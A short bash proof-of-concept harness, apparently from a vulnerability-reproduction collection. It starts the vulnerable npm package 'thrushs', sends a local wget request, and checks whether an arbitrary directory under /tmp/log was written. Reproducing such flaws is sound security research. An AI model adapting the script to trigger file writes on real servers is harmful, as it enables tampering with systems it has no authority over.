#!/bin/bash
# author: Liang Gong

if [ "$(uname)" == "Darwin" ]; then
    # under Mac OS X platform
    NODE='node'       
elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
    # under GNU/Linux platform
    NODE='nodejs'
fi

pkg_name='thrushs'
vuln_file='/tmp/log/thrush'
cd arbitrary-write/${pkg_name}

RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

mkdir /tmp/log
rm -f ${vuln_file}
if [ ! -f $vuln_file ]; then
    echo -e "\t[${GREEN}vuln file does not exist${NC}]: ${vuln_file}"
fi

# start the server
echo -e "\t[${GREEN}start vulnerable package${NC}]: ${BLUE}${pkg_name}${NC}"
$NODE test.js >/dev/null 2>&1 &
vulnpid=$!

# wait for the server to get started
sleep 0.5s

wget http://127.0.0.1:8124/dummy.txt >/dev/null 2>&1

sleep 1s

if [ -d $vuln_file ]; then
    echo -e "\t[${RED}vulnerable dir created${NC}]: ${vuln_file}"
    echo -e "\t[${RED}created directory structure${NC}]:"
    tree ${vuln_file}
fi

# kill the vulnerable npm package's process
kill -9 $vulnpid >/dev/null 2>&1
